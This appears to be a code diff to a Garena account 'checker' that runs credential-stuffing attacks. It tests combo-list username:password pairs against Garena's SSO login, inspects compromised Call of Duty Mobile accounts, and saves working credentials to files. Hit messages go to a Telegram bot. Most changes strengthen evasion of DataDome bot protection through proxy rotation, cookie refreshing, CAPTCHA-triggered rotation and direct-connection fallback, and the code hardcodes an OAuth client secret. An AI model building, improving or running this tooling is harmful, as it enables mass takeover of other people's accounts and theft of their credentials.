@@ -681,35 +1244,83 @@ class DataDomeManager:
             logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
             return False
 
+    def refresh_datadome(self, session):
+        """Force-fetch a fresh DataDome cookie through the session's current proxy.
+        Returns True if a new cookie was obtained."""
+        try:
+            fresh_dd = get_datadome_cookie(session)
+            if fresh_dd:
+                self.set_datadome(fresh_dd)
+                self.set_session_datadome(session, fresh_dd)
+                logger.info(f"[DD] 🍪 Fresh DataDome cookie obtained via proxy")
+                return True
+            else:
+                logger.warning(f"[DD] ⚠️ Failed to get DataDome cookie from current proxy")
+                return False
+        except Exception as e:
+            logger.warning(f"[DD] ⚠️ Error refreshing DataDome: {e}")
+            return False
+
     def handle_403(self, session, telegram_config=None):
-        """On EVERY 403 — immediately force-rotate proxy, refresh DataDome, resume."""
+        """On 403 — try DataDome refresh first, then proxy rotation.
+        
+        Recovery strategy (in order):
+        1. If cookie is stale or missing → try refreshing DataDome on current proxy
+        2. Force-rotate proxy + get fresh DataDome
+        3. Smart-rotate proxy + get fresh DataDome  
+        4. If no proxies available, try direct connection with fresh DataDome
+        """
         self._403_attempts += 1
 
-        old_proxy = geo_rotator.current_proxy
+        logger.warning(f"[403] 🚫 Access denied (attempt #{self._403_attempts})")
 
-        logger.warning(f"[403] 🚫 Access denied — force-rotating proxy instantly... (attempt #{self._403_attempts})")
+        # ── Step 1: Try refreshing DataDome on current proxy first ──
+        if self.is_cookie_stale() or not self.current_datadome:
+            logger.info(f"[403] 🔄 Cookie stale/missing — refreshing DataDome on current proxy...")
+            if self.refresh_datadome(session):
+                self._403_attempts = 0
+                logger.info(f"[403] ✅ Recovered with fresh DataDome (same proxy)")
+                return True
 
-        # ── Try up to 3 proxy rotations for fast recovery ────────────────────
-        for rot_attempt in range(3):
+        # ── Step 2: Try up to 5 proxy rotations for recovery ──
+        max_rotations = min(5, max(3, geo_rotator.total // 10))  # Scale with pool size
+        for rot_attempt in range(max_rotations):
             try:
                 if rot_attempt == 0:
                     new_proxy = geo_rotator.force_rotate()
                 else:
                     new_proxy = geo_rotator.smart_rotate()
+                    
+                if not new_proxy:
+                    logger.warning(f"[403] ⚠️ No proxy available for rotation (pool empty)")
+                    break
+                    
                 session.proxies.update(geo_rotator.get_proxies())
-                logger.info(f"[403] ✅ Thread {threading.get_ident()} rotated → {new_proxy}")
+                logger.info(f"[403] 🔄 Rotated → {new_proxy}")
 
-                new_datadome = get_datadome_cookie(session)
-                if new_datadome:
-                    self.set_datadome(new_datadome)
-                    self.set_session_datadome(session, new_datadome)
+                # Try getting fresh DataDome through new proxy
+                if self.refresh_datadome(session):
                     self._403_attempts = 0
-                    logger.info(f"[403] 🍪 Fresh DataDome obtained | New proxy: {new_proxy}")
+                    logger.info(f"[403] ✅ Fresh DataDome + new proxy: {new_proxy}")
                     return True
+                    
             except Exception as e:
                 logger.warning(f"[403] ⚠️ Rotation attempt {rot_attempt+1} failed: {e}")
 
-        logger.error(f"[403] ❌ Failed to recover after 3 proxy rotations — skipping account")
+        # ── Step 3: Last resort — try direct connection (no proxy) with fresh DataDome ──
+        if geo_rotator.total > 0:
+            logger.warning(f"[403] 🔄 All proxies exhausted — trying direct connection...")
+            session.proxies.clear()
+            if self.refresh_datadome(session):
+                self._403_attempts = 0
+                logger.info(f"[403] ✅ Direct connection + fresh DataDome works!")
+                # Restore proxy for subsequent requests
+                session.proxies.update(geo_rotator.get_proxies())
+                return True
+            # Restore proxy even on failure
+            session.proxies.update(geo_rotator.get_proxies())
+
+        logger.error(f"[403] ❌ Failed to recover after {max_rotations} rotations — skipping account")
         return False
 
 class LiveStats:
@@ -736,6 +1347,8 @@ class LiveStats:
         }
         # Server/region distribution tracking
         self.server_distribution = {}
+        # Country distribution tracking
+        self.country_distribution = {}
 
     def start_tracking(self, total_accounts):
         """Initialize progress tracking with total account count."""
@@ -747,7 +1360,7 @@ class LiveStats:
             self.current_speed = 0.0
             self.eta_seconds = None
 
-    def update_stats(self, valid=False, clean=False, has_codm=False, codm_level=0, region=""):
+    def update_stats(self, valid=False, clean=False, has_codm=False, codm_level=0, region="", country=""):
         with self.lock:
             self.total_processed += 1
 
@@ -777,6 +1390,10 @@ class LiveStats:
                     if region and region not in ('N/A', '', 'NONE', 'NULL'):
                         r = region.upper().strip()
                         self.server_distribution[r] = self.server_distribution.get(r, 0) + 1
+                    # Track country distribution
+                    if country and country not in ('N/A', '', 'NONE', 'NULL'):
+                        c = country.upper().strip()
+                        self.country_distribution[c] = self.country_distribution.get(c, 0) + 1
                 else:
                     self.no_codm_count += 1
             else:
@@ -823,6 +1440,7 @@ class LiveStats:
                 'elapsed': time.time() - self.start_time if self.start_time else 0,
                 'level_distribution': dict(self.level_distribution),
                 'server_distribution': dict(self.server_distribution),
+                'country_distribution': dict(self.country_distribution),
             }
 
     def get_progress_bar(self, width=30):
@@ -974,6 +1592,20 @@ class LiveStats:
                     lines.append(f"  {region:<5} : [{bar_srv}] {count} ({pct_srv:.1f}%)")
                 lines.append(f"━━━━━━━━━━━━━━━━━━━━")
 
+            # Country Distribution (only if we have country data)
+            if self.country_distribution:
+                lines.append(f"🌍 Country Distribution")
+                sorted_countries = sorted(self.country_distribution.items(), key=lambda x: x[1], reverse=True)
+                total_countries = sum(v for _, v in sorted_countries)
+                for cname, count in sorted_countries[:15]:
+                    pct_c = (count / total_countries * 100) if total_countries > 0 else 0
+                    bar_c = self._make_bar(count, total_countries, 10)
+                    lines.append(f"  {cname:<5} : [{bar_c}] {count} ({pct_c:.1f}%)")
+                if len(sorted_countries) > 15:
+                    others = sum(v for _, v in sorted_countries[15:])
+                    lines.append(f"  Other : {others} ({others/total_countries*100:.1f}%)")
+                lines.append(f"━━━━━━━━━━━━━━━━━━━━")
+
             return "\n".join(lines)
 
     def save_progress(self, filepath="progress_resume.json"):
@@ -1060,7 +1692,9 @@ def applyck(session, cookie_str):
     else:
         logger.warning(f"[WARNING] No valid cookies found in the provided string")
 
-def get_datadome_cookie(session):
+def get_datadome_cookie(session, max_retries=3):
+    """Fetch a fresh DataDome cookie from dd.garena.com/js/.
+    Retries up to max_retries times with proxy rotation on failure."""
     url = 'https://dd.garena.com/js/'
     headers = {
         'accept': '*/*',
@@ -1094,23 +1728,33 @@ def get_datadome_cookie(session):
 
     data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
 
-    try:
-        # Use session (which has the thread's proxy set) instead of bare requests
-        # This ensures datadome is fetched through the same proxy as the thread
-        response = session.post(url, headers=headers, data=data, timeout=8)
-        response.raise_for_status()
-        response_json = response.json()
+    for attempt in range(1, max_retries + 1):
+        try:
+            response = session.post(url, headers=headers, data=data, timeout=8)
+            response.raise_for_status()
+            response_json = response.json()
+            
+            if response_json.get('status') == 200 and 'cookie' in response_json:
+                cookie_string = response_json['cookie']
+                datadome = cookie_string.split(';')[0].split('=')[1]
+                return datadome
+            else:
+                _status = response_json.get('status', 'unknown')
+                logger.warning(f"[DATADOME] Attempt {attempt}/{max_retries}: API returned status {_status} (no cookie)")
+        except requests.exceptions.RequestException as e:
+            logger.warning(f"[DATADOME] Attempt {attempt}/{max_retries}: Request failed — {e}")
         
-        if response_json['status'] == 200 and 'cookie' in response_json:
-            cookie_string = response_json['cookie']
-            datadome = cookie_string.split(';')[0].split('=')[1]
-            return datadome
-        else:
-            logger.error(f"DataDome cookie not found in response. Status code: {response_json['status']}")
-            return None
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Error getting DataDome cookie: {e}")
-        return None
+        # Rotate proxy for next attempt (if not the last try)
+        if attempt < max_retries:
+            try:
+                geo_rotator.smart_rotate()
+                session.proxies.update(geo_rotator.get_proxies())
+            except Exception:
+                pass
+            time.sleep(0.3 * attempt)  # small backoff
+
+    logger.error(f"[DATADOME] Failed to get DataDome cookie after {max_retries} attempts")
+    return None
     
 def prelogin(session, account, datadome_manager, telegram_config=None):
     url = 'https://sso.garena.com/api/prelogin'
@@ -1128,7 +1772,12 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
         'id': str(int(time.time() * 1000))
     }
     
-    retries = 2  # reduced to lower VPS load
+    # ── Pre-fetch DataDome if stale or missing ──
+    if datadome_manager.is_cookie_stale() or not datadome_manager.get_datadome():
+        logger.info(f"   🍪 DataDome cookie stale/missing — refreshing before prelogin...")
+        datadome_manager.refresh_datadome(session)
+    
+    retries = 3  # 3 retries (up from 2) for better recovery
     for attempt in range(retries):
         try:
             current_cookies = session.cookies.get_dict()
@@ -1195,49 +1844,61 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
             
             new_datadome = new_cookies.get('datadome')
             
+            # ── Handle 403 DataDome challenge ──
             if response.status_code == 403:
-                logger.error(f"      🚫 Access denied (403)")
-                logger.error(f"      🛡️ Security check triggered")
+                logger.warning(f"      🚫 403 — DataDome challenge detected (attempt {attempt+1}/{retries})")
                 
-                if new_cookies and attempt < retries - 2:
-                    logger.info(f"      🔄 Retrying with new cookies...")
+                # If we got new cookies, try immediately with them
+                if new_cookies and attempt < retries - 1:
+                    logger.info(f"      🍪 Got new cookies from 403 response — retrying...")
+                    datadome_manager.refresh_datadome(session)
                     backoff(attempt)
                     continue
                 
+                # Let DataDomeManager handle the 403 (proxy rotation + DD refresh)
                 if datadome_manager.handle_403(session, telegram_config=telegram_config):
+                    # Recovery succeeded — signal to outer loop to retry with new proxy/DD
                     return "IP_BLOCKED", None, None
                 else:
-                    logger.error(f"      🚨 IP blocked - cannot continue")
+                    logger.error(f"      🚨 DataDome block unrecoverable — skipping account")
                     return None, None, new_datadome
-                
-                if attempt < retries - 2:
-                    backoff(attempt)
-                    continue
-                return None, None, new_datadome
             
             response.raise_for_status()
             
             try:
                 data = response.json()
             except json.JSONDecodeError:
-                logger.error(f"      ✘ Invalid response format")
-                logger.error(f"      📄 Could not parse server response")
+                logger.error(f"      ✗ Invalid response format")
+                # Check if response looks like a DataDome challenge
+                resp_text = response.text[:200] if response.text else ""
+                if "captcha-delivery" in resp_text:
+                    logger.warning(f"      🛡️ Response contains DataDome CAPTCHA redirect")
+                    if attempt < retries - 1:
+                        datadome_manager.refresh_datadome(session)
+                        backoff(attempt)
+                        continue
                 if attempt < retries - 1:
                     backoff(attempt)
                     continue
                 return None, None, new_datadome
             
             if 'error' in data:
-                logger.error(f"      ✘ Error: {data['error']}")
-                logger.error(f"      ⚠️ Server returned an error")
+                error_msg = data.get('error', '')
+                # Distinguish between "account not found" and DataDome errors
+                if 'captcha' in str(error_msg).lower() or 'blocked' in str(error_msg).lower():
+                    logger.warning(f"      🛡️ DataDome error in response: {error_msg}")
+                    if attempt < retries - 1:
+                        datadome_manager.refresh_datadome(session)
+                        backoff(attempt)
+                        continue
+                logger.error(f"      ✗ Error: {error_msg}")
                 return None, None, new_datadome
                 
             v1 = data.get('v1')
             v2 = data.get('v2')
             
             if not v1 or not v2:
-                logger.error(f"      ✘ Missing authentication data")
-                logger.error(f"      📋 Incomplete server response")
+                logger.error(f"      ✗ Missing authentication data")
                 return None, None, new_datadome
                 
             logger.info(f"   ✔ Prelogin successful")
@@ -1247,8 +1908,7 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
         except requests.exceptions.HTTPError as e:
             if hasattr(e, 'response') and e.response is not None:
                 if e.response.status_code == 403:
-                    logger.error(f"      🚫 Access denied (403)")
-                    logger.error(f"      🛡️ Security check triggered")
+                    logger.warning(f"      🚫 403 (HTTPError) — DataDome challenge")
                     
                     new_cookies = {}
                     if 'set-cookie' in e.response.headers:
@@ -1266,29 +1926,23 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
                                 except Exception as ex:
                                     pass
                     
-                    if new_cookies and attempt < retries - 2:
-                        logger.info(f"      🔄 Retrying with new cookies...")
+                    if new_cookies and attempt < retries - 1:
+                        logger.info(f"      🍪 Got new cookies from 403 — retrying...")
+                        datadome_manager.refresh_datadome(session)
                         backoff(attempt)
                         continue
                     
                     if datadome_manager.handle_403(session, telegram_config=telegram_config):
                         return "IP_BLOCKED", None, None
                     else:
-                        logger.error(f"      🚨 IP blocked - cannot continue")
+                        logger.error(f"      🚨 DataDome block unrecoverable")
                         return None, None, new_cookies.get('datadome')
-                        
-                    if attempt < retries - 2:
-                        backoff(attempt)
-                        continue
-                    return None, None, new_cookies.get('datadome')
                 else:
-                    logger.error(f"      ✘ HTTP {e.response.status_code}")
-                    logger.error(f"      🖥️ Server error")
+                    logger.error(f"      ✗ HTTP {e.response.status_code}")
             else:
-                logger.error(f"      ✘ Connection error")
-                logger.error(f"      🌐 Could not reach server")
+                logger.error(f"      ✗ Connection error")
                 
-            if attempt < retries - 2:
+            if attempt < retries - 1:
                 backoff(attempt)
                 continue
         except requests.exceptions.ConnectionError as e:
@@ -1301,11 +1955,11 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
 
         except Exception as e:
             err = str(e)
-            if any(kw in err for kw in ('ConnectionPool', 'HTTPSConnection', 'Max retries', 'RemoteDisconnected', 'Connection refused', 'ProxyError')):
+            if any(kw in err for kw in ('ConnectionPool', 'HTTPSConnection', 'Max retries', 'RemoteDisconnected', 'Connection refused', 'ProxyError', 'SOCKS')):
                 logger.warning(f"      🔌 Proxy connection failed: {err[:80]}")
                 return "CONN_ERROR", None, None
             logger.error(f"      💥 Unexpected error: {err[:50]}")
-            if attempt < retries - 2:
+            if attempt < retries - 1:
                 backoff(attempt)
                 
     return None, None, None
@@ -1339,10 +1993,10 @@ def login(session, account, password, v1, v2):
     if cookie_header:
         headers['cookie'] = cookie_header
     
-    retries = 2  # reduced to lower VPS load
+    retries = 2  # 2 fast retries on login
     for attempt in range(retries):
         try:
-            response = session.get(url, headers=headers, params=params, timeout=8)
+            response = session.get(url, headers=headers, params=params, timeout=5)
             response.raise_for_status()
             
             login_cookies = {}
@@ -1390,8 +2044,10 @@ def login(session, account, password, v1, v2):
                     logger.warning(f"         └─ 🔑 Reason: {error_msg}")
                     return None
                 elif 'captcha' in error_msg.lower():
-                    logger.warning(f"     ✘ Login failed: Captcha required")
+                    logger.warning(f"     ✘ Login failed: Captcha required — rotating proxy")
                     logger.warning(f"         └─ 🤖 Reason: {error_msg}")
+                    geo_rotator.force_rotate()
+                    session.proxies.update(geo_rotator.get_proxies())
                     backoff(attempt)
                     continue
                 else:
@@ -1442,7 +2098,7 @@ def get_codm_access_token(session):
         device_id = f'02-{str(uuid.uuid4())}'
         grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'
         
-        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=10)
+        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=5)
         grant_json = grant_response.json()
         auth_code = grant_json.get('code', '')
         
@@ -1460,7 +2116,7 @@ def get_codm_access_token(session):
         
         token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
         
-        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=10)
+        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=5)
         token_json = token_response.json()
         
         access_token = token_json.get('access_token', '')
@@ -1484,7 +2140,7 @@ def process_codm_callback(session, access_token, open_id=None, uid=None):
             'referer': 'https://auth.garena.com/'
         }
         
-        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=10)
+        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=5)
         location = old_response.headers.get('Location', '')
         
         if 'err=3' in location:
@@ -1502,7 +2158,7 @@ def process_codm_callback(session, access_token, open_id=None, uid=None):
             'x-requested-with': 'com.garena.game.codm'
         }
         
-        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=10)
+        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=5)
         aos_location = aos_response.headers.get('Location', '')
         
         if 'err=3' in aos_location:
@@ -1551,7 +2207,7 @@ def get_codm_user_info(session, token):
             'x-requested-with': 'com.garena.game.codm'
         }
         
-        response = session.get(url, headers=headers, timeout=10)
+        response = session.get(url, headers=headers, timeout=5)
         data = response.json()
         user_data = data.get('user', {})
         
@@ -1572,30 +2228,44 @@ def get_codm_user_info(session, token):
         return {}
 
 def check_codm_account(session, account):
-    """Check if account has CODM"""
+    """Check if account has CODM — retries once on transient failures."""
     codm_info = {}
     has_codm = False
-    try:
-        access_token, open_id, uid = get_codm_access_token(session)
-        if not access_token:
-            logger.warning('      └─ ⚠️ No CODM access token')
-            return (has_codm, codm_info)
-        else:
+    for codm_attempt in range(2):  # retry once on failure
+        try:
+            access_token, open_id, uid = get_codm_access_token(session)
+            if not access_token:
+                if codm_attempt == 0:
+                    logger.debug('      └─ ⚠️ No CODM access token — retrying...')
+                    backoff(0)
+                    continue
+                logger.warning('      └─ ⚠️ No CODM access token')
+                return (has_codm, codm_info)
+
             codm_token, status = process_codm_callback(session, access_token, open_id, uid)
             if status == 'no_codm':
                 logger.info('      └─ 📭 No CODM detected')
                 return (has_codm, codm_info)
-            else:
-                if status != 'success' or not codm_token:
-                    logger.warning(f'      └─ ⚠️ CODM callback failed: {status}')
-                    return (has_codm, codm_info)
-                else:
-                    codm_info = get_codm_user_info(session, codm_token)
-                    if codm_info:
-                        has_codm = True
-                        logger.info(f"      └─ 🎮 CODM detected: Level {codm_info.get('codm_level', 'N/A')}")
-    except Exception as e:
-        logger.error(f'      └─ ✘ Error checking CODM: {e}')
+
+            if status != 'success' or not codm_token:
+                if codm_attempt == 0:
+                    logger.debug(f'      └─ ⚠️ CODM callback failed: {status} — retrying...')
+                    backoff(0)
+                    continue
+                logger.warning(f'      └─ ⚠️ CODM callback failed: {status}')
+                return (has_codm, codm_info)
+
+            codm_info = get_codm_user_info(session, codm_token)
+            if codm_info:
+                has_codm = True
+                logger.info(f"      └─ 🎮 CODM detected: Level {codm_info.get('codm_level', 'N/A')}")
+            return (has_codm, codm_info)
+        except Exception as e:
+            if codm_attempt == 0:
+                logger.debug(f'      └─ ✘ Error checking CODM: {e} — retrying...')
+                backoff(0)
+                continue
+            logger.error(f'      └─ ✘ Error checking CODM: {e}')
     return (has_codm, codm_info)
 
 def display_codm_info(account_details, codm_info):
@@ -1765,23 +2435,10 @@ def save_clean_or_notclean(account, password, details, codm_info, result_folder=
   [] CONFIG BY: @Yukiii_ii
 =======================================
 """
-        # Save to main clean.txt or notclean.txt
-        if is_clean:
-            file_path = os.path.join(result_folder, 'clean.txt')
-        else:
-            file_path = os.path.join(result_folder, 'notclean.txt')
-            
-        account_exists = False
-        identifier = f"  [+] Username       : {username}:{password}"
-        
-        if os.path.exists(file_path):
-            with open(file_path, "r", encoding="utf-8") as f:
-                if identifier in f.read():
-                    account_exists = True
-
-        if not account_exists:
-            with open(file_path, "a", encoding="utf-8") as f:
-                f.write(content_to_save.strip() + "\n\n")
+        # Save to main clean.txt or notclean.txt (append-only, skip full-file scan)
+        file_path = os.path.join(result_folder, 'clean.txt' if is_clean else 'notclean.txt')
+        with open(file_path, "a", encoding="utf-8") as f:
+            f.write(content_to_save.strip() + "\n\n")
 
         # Save to organized CODM folder structure if has CODM
         if codm_info and codm_info.get('codm_nickname') and codm_info.get('codm_nickname') != 'N/A':
@@ -1911,32 +2568,50 @@ def parse_account_details(data):
 
 def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder='Results', telegram_config=None):
     try:
-        MAX_IP_BLOCK_RETRIES = 3   # 3 fast retries with proxy rotation
+        MAX_IP_BLOCK_RETRIES = 3   # 3 retries (up from 2) — better recovery with improved DD handling
         v1, v2, new_datadome = None, None, None
 
+        # ── If we have no datadome at all, try fetching one before starting ──
+        if not datadome_manager.get_datadome():
+            fresh_dd = get_datadome_cookie(session, max_retries=2)
+            if fresh_dd:
+                datadome_manager.set_datadome(fresh_dd)
+                datadome_manager.set_session_datadome(session, fresh_dd)
+
         for ip_block_attempt in range(MAX_IP_BLOCK_RETRIES):
+            # ── Ensure session has a fresh DataDome cookie before each attempt ──
             datadome_manager.clear_session_datadome(session)
             current_datadome = datadome_manager.get_datadome()
             if current_datadome:
                 datadome_manager.set_session_datadome(session, current_datadome)
+            elif datadome_manager.is_cookie_stale():
+                # Cookie is stale — try refreshing it before prelogin
+                datadome_manager.refresh_datadome(session)
 
             v1, v2, new_datadome = prelogin(session, account, datadome_manager, telegram_config=telegram_config)
 
             if v1 == "IP_BLOCKED":
-                logger.warning(f"[RETRY] IP blocked attempt {ip_block_attempt + 1}/{MAX_IP_BLOCK_RETRIES} — rotating proxy...")
+                logger.warning(f"[RETRY] IP blocked attempt {ip_block_attempt + 1}/{MAX_IP_BLOCK_RETRIES} — rotating proxy + refreshing DataDome...")
+                # Try force-rotate first
                 new_proxy = geo_rotator.force_rotate()
-                session.proxies.update(geo_rotator.get_proxies())
-                # Refresh datadome on new proxy
-                fresh_dd = get_datadome_cookie(session)
-                if fresh_dd:
-                    datadome_manager.set_datadome(fresh_dd)
-                    datadome_manager.set_session_datadome(session, fresh_dd)
+                if new_proxy:
+                    session.proxies.update(geo_rotator.get_proxies())
+                    # Refresh DataDome on new proxy
+                    datadome_manager.refresh_datadome(session)
+                else:
+                    logger.warning(f"[RETRY] No proxy available for rotation — trying direct connection")
+                    session.proxies.clear()
+                    datadome_manager.refresh_datadome(session)
                 continue
 
             if v1 == "CONN_ERROR":
                 logger.warning(f"[RETRY] Connection error attempt {ip_block_attempt + 1}/{MAX_IP_BLOCK_RETRIES} — smart rotating...")
-                geo_rotator.smart_rotate()
-                session.proxies.update(geo_rotator.get_proxies())
+                new_proxy = geo_rotator.smart_rotate()
+                if new_proxy:
+                    session.proxies.update(geo_rotator.get_proxies())
+                else:
+                    logger.warning(f"[RETRY] No proxy available — trying direct connection")
+                    session.proxies.clear()
                 continue
 
             break  # prelogin succeeded or hard-failed — exit retry loop
@@ -1944,7 +2619,8 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
         if v1 in ("IP_BLOCKED", "CONN_ERROR"):
             logger.error(f"[RETRY] Exhausted {MAX_IP_BLOCK_RETRIES} retries for {account} — skipping")
             live_stats.update_stats(valid=False)
-            return f"🚨 Proxy exhausted - Skipped after {MAX_IP_BLOCK_RETRIES} retries"
+            reason = "🛡️ DataDome blocked" if v1 == "IP_BLOCKED" else "🔌 Proxy exhausted"
+            return f"🚨 {reason} - Skipped after {MAX_IP_BLOCK_RETRIES} retries"
 
         if not v1 or not v2:
             live_stats.update_stats(valid=False)
@@ -1962,7 +2638,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
         
         # ── account/init with retry on 403 ───────────────────────
         account_data = None
-        for init_attempt in range(4):  # up to 4 tries
+        for init_attempt in range(2):  # 2 fast tries then skip
             current_cookies = session.cookies.get_dict()
             cookie_parts = []
             for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
@@ -1978,14 +2654,13 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             if cookie_header:
                 headers['cookie'] = cookie_header
 
-            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=10)
+            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=5)
 
             if response.status_code == 403:
-                logger.warning(f"[INIT] 403 on account/init attempt {init_attempt + 1}/4")
+                logger.warning(f"[INIT] 403 on account/init attempt {init_attempt + 1}/2")
                 if datadome_manager.handle_403(session, telegram_config=telegram_config):
-                    # Rotated and got new datadome — wait then retry the init request
                     logger.info(f"[INIT] Proxy rotated — retrying account/init...")
-                    time.sleep(0.02 + init_attempt * 0.02)
+                    time.sleep(0.01 + init_attempt * 0.01)
                     session.proxies.update(geo_rotator.get_proxies())
                     continue
                 else:
@@ -2115,7 +2790,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                             f'━━━━━━━━━━━━━━━━━━━━\n'
                             f'⚡ by @Yukiii_ii'
                         )
-                        send_telegram_message(tg_token, tg_chat, shell_msg)
+                        _send_telegram_async(tg_token, tg_chat, shell_msg)
             return ""
         
         fresh_datadome = datadome_manager.extract_datadome_from_session(session)
@@ -2127,7 +2802,8 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
 
         _codm_lvl = codm_info.get('codm_level', 0) if has_codm and codm_info else 0
         _codm_rgn = codm_info.get('region', '') if has_codm and codm_info else ''
-        live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm, codm_level=_codm_lvl, region=_codm_rgn)
+        _acc_country = details.get('personal', {}).get('country', '') if details else ''
+        live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm, codm_level=_codm_lvl, region=_codm_rgn, country=_acc_country)
         
         username = details.get('username', account)
         email = details.get('email', 'N/A')
@@ -2240,7 +2916,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                     f'━━━━━━━━━━━━━━━━━━━━\n'
                     f'⚡ by @Yukiii_ii'
                 )
-                send_telegram_message(tg_token, tg_chat, tg_msg)
+                _send_telegram_async(tg_token, tg_chat, tg_msg)
 
         return ""
 
@@ -2318,17 +2994,28 @@ def save_telegram_config(config: dict):
     with open(TELEGRAM_CONFIG_FILE, "w", encoding="utf-8") as f:
         json.dump(config, f, indent=2)
 
+_tg_hit_session = requests.Session()
+_tg_hit_session.mount("https://", requests.adapters.HTTPAdapter(pool_connections=2, pool_maxsize=4))
+
 def send_telegram_message(bot_token: str, chat_id, message: str, parse_mode: str = "HTML"):
     """Send a Telegram message. Returns message_id on success, None on failure."""
     try:
         url  = f"https://api.telegram.org/bot{bot_token}/sendMessage"
         data = {"chat_id": chat_id, "text": message, "parse_mode": parse_mode}
-        resp = requests.post(url, data=data, timeout=10)
+        resp = _tg_hit_session.post(url, data=data, timeout=5)
         if resp.status_code == 200:
             return resp.json().get("result", {}).get("message_id")
     except Exception:
         pass
     return None
+
+def _send_telegram_async(bot_token: str, chat_id, message: str, parse_mode: str = "HTML"):
+    """Fire-and-forget Telegram message — doesn't block the checker thread."""
+    threading.Thread(
+        target=send_telegram_message,
+        args=(bot_token, chat_id, message, parse_mode),
+        daemon=True,
+    ).start()
 
 def delete_telegram_message(bot_token: str, chat_id, message_id, delay: int = 5):
     """Delete a Telegram message after a delay (seconds)."""
@@ -2513,13 +3200,19 @@ def print_banner():
     print()
 
 def create_thread_session(cookie_manager, datadome_manager):
-    """Create a fast cloudscraper session with keep-alive and pooled connections."""
+    """Create a fast cloudscraper session with keep-alive and lean connection pools.
+    Each thread only talks to ~3 hosts (sso.garena, account.garena, codm.garena)
+    so large pools waste RAM. Keep pools tiny → more threads can run at once.
+    
+    Proxy strategy:
+    1. If proxies available → use them (DataDome bypass via clean IP)
+    2. If no proxies → try direct connection (works on non-flagged IPs)
+    3. Always attempt to get a fresh DataDome cookie for the session"""
     sess = cloudscraper.create_scraper()
-    # ── Optimised adapter: max pooling for speed ────────────────
     adapter = requests.adapters.HTTPAdapter(
-        pool_connections=8,
-        pool_maxsize=20,      # max parallel connections pooled = fewer reconnects
-        max_retries=1,        # one retry for transient failures
+        pool_connections=3,
+        pool_maxsize=5,
+        max_retries=1,
     )
     sess.mount("http://",  adapter)
     sess.mount("https://", adapter)
@@ -2529,8 +3222,16 @@ def create_thread_session(cookie_manager, datadome_manager):
         "Accept-Encoding":  "gzip, deflate, br",
         "Accept":           "application/json, text/plain, */*",
     })
-    # Set proxy FIRST so datadome fetch also goes through this thread's proxy
-    sess.proxies.update(geo_rotator.get_proxies())
+    
+    # ── Set proxy — if available ──
+    proxy_dict = geo_rotator.get_proxies()
+    if proxy_dict:
+        sess.proxies.update(proxy_dict)
+        logger.info(f"[SESSION] Thread {threading.get_ident()} using proxy: {proxy_dict.get('https', 'N/A')}")
+    else:
+        logger.warning(f"[SESSION] Thread {threading.get_ident()} ⚠️ No proxy available — using direct connection")
+    
+    # ── DataDome cookie setup ──
     valid_cookies = cookie_manager.get_valid_cookies()
     if valid_cookies:
         combined_cookie_str = "; ".join(valid_cookies)
@@ -2543,10 +3244,28 @@ def create_thread_session(cookie_manager, datadome_manager):
         )
         if datadome_value:
             datadome_manager.set_datadome(datadome_value)
+        else:
+            # Cookie in file didn't have a valid datadome — fetch fresh one
+            datadome = get_datadome_cookie(sess)
+            if datadome:
+                datadome_manager.set_datadome(datadome)
     else:
         datadome = get_datadome_cookie(sess)
         if datadome:
             datadome_manager.set_datadome(datadome)
+    # ── Safety net: if we STILL have no datadome, try one more time with forced rotation ──
+    if not datadome_manager.get_datadome():
+        try:
+            geo_rotator.force_rotate()
+            sess.proxies.update(geo_rotator.get_proxies())
+            datadome = get_datadome_cookie(sess, max_retries=2)
+            if datadome:
+                datadome_manager.set_datadome(datadome)
+                logger.info(f"[DATADOME] ✅ Got cookie on forced rotation retry")
+            else:
+                logger.warning(f"[DATADOME] ⚠️ Still no cookie after forced rotation — thread will retry during processaccount")
+        except Exception as e:
+            logger.warning(f"[DATADOME] ⚠️ Forced rotation failed: {e}")
     return sess
 
 
@@ -2554,11 +3273,12 @@ def _cleanup_stale_files():
     """
     Delete leftover combo/ and *_results/ folders from previous crashes.
     Called once at bot startup to recover disk space.
+    NOTE: Does NOT touch saved_combos/ or saved_proxies/ — those are persistent across restarts.
     """
     import shutil, glob
     base = os.path.dirname(os.path.abspath(__file__))
 
-    # combo/ folder — temp uploaded files
+    # combo/ folder — temp uploaded files (safe to delete, saved_combos/ has persistent copies)
     combo_dir = os.path.join(base, "combo")
     if os.path.isdir(combo_dir):
         for f in os.listdir(combo_dir):
@@ -2579,27 +3299,95 @@ def _cleanup_stale_files():
             except Exception:
                 pass
 
+    # saved_combos/ is NEVER cleaned — these persist across restarts for auto-resume
+    # saved_proxies/ is NEVER cleaned — these persist across restarts for proxy auto-restore
